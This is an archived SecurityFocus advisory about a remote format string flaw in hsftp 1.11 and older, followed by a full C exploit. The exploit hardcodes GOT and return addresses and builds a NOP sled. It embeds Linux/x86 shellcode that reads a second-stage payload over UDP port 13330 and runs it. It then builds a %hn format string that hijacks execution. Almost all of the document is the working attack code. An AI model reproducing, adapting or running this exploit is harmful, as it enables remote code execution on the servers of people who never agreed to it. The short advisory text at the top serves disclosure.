source: http://www.securityfocus.com/bid/9715/info

hsftp has been found to be prone to a remote print format string vulnerability. This issue is due to the application improper use of a format printing function.

Ultimately this vulnerability could allow for execution of arbitrary code on the system implementing the affected software, which would occur in the security context of the server process.

// priestmasters hsftp <=1.11 remote format string exploit
// mail: priest@priestmaster.org
// url: http://www.priestmaster.org
// I know, it have not any command line parameter (I use #define AAA).
// I do not calculate the values for the format string and so on,
// But it works, if you follow the steps in the README file.
// This exploit is very ugly but I'm very busy. Sorry

#include <stdio.h>

#define PORT    "\x34\x12"		// Udp port 13330
					// You can use other ports,
					// if you want.

// Change it with your values
#define FPUTCGOT	0x0804e1dc	// Got of fputc
#define RETADDR		0xbffff660	// return address
#define PADDING		0		
#define STACKPOP	10
#define FMTNUM1		60000		// First number for short write
#define FMTNUM2		50000		// Second number for short write

// This works only with hsftp 1.11 SUSE 7.0 compiled from source.
/* #define FPUTCGOT	0x0804e1dc	// deregister frame pointer 
					// GOT, dtor are also possible
#define RETADDR		0xbffff660	// Shellcode location

#define PADDING		0		// Padding
#define STACKPOP	10		// How many %x needed

#define FMTNUM1		62864
#define FMTNUM2		51615 */

////////////////////////////////////////////////////////////////////////////

#define NOP		'G'
#define DUMMY		'A'
#define NOPSPACE	140

/**
 ** Linux/x86 udp + read + exec shellcode (c) gunzip
 **
 ** reads from udp port 13330 another shellcode then executes it
 **
 ** 1. Udp is usually not filtered
 ** 2. You can send very big shellcode (size <= 65535)
 ** 3. It's shorter than any tcp bind-shellcode (just 60 bytes)
 ** 4. Your sent shellcodes can contain any char ( 0x00 too )
 ** 5  You can send a whole shell script to execute with a command code
 ** 6. Does not contain CR, LF, spaces, slashes and so on
 ** 7. No need to search for file descriptors
 **
 ** gunzip@ircnet <techieone@softhome.net>
 ** http://members.xoom.it/gunzip
**/

char shellcode[]=
        "\x31\xc0\x31\xdb\x43\x50\x6a\x02\x6a\x02\x89\xe1\xb0\x66\xcd\x80"
        "\x4b\x53\x53\x53\x66\x68" PORT "\x66\x6a\x02\x89\xe1\x6a\x16\x51"
        "\x50\x89\xe1\xb3\x02\x6a\x66\x58\xcd\x80\x8b\x1c\x24\x99\x66\xba"
        "\xff\xff\x29\xd4\x89\xe1\xb0\x03\xcd\x80\xff\xe1";


main()
{
	char xplbuf[BUFSIZ];	// Our exploit buffer
	char *p = xplbuf;	// Our exploit pointer

	// Null terminate the string
	memset(p, 0x00, BUFSIZ);

	// Make the padding:
	memset(p, DUMMY, PADDING);
	p += PADDING;

	// Copy the return Address with Junk to xplbuf
	*((void **)p) = (void *) FPUTCGOT;
	p += 4;
	*((void **)p) = (void *) FPUTCGOT+2;
	p += 4;

	// Create the nops
	memset(p, NOP, NOPSPACE);
	p += NOPSPACE;

	// Copy shellcode
	memcpy(p, shellcode, strlen(shellcode));
	p += strlen(shellcode);

	// Create format string
	sprintf(p, "%%%dx%%%d$hn%%%dx%%%d$hn", FMTNUM1, STACKPOP, FMTNUM2, STACKPOP+1);
	
	// Print the whole string
	printf("%s", xplbuf);
}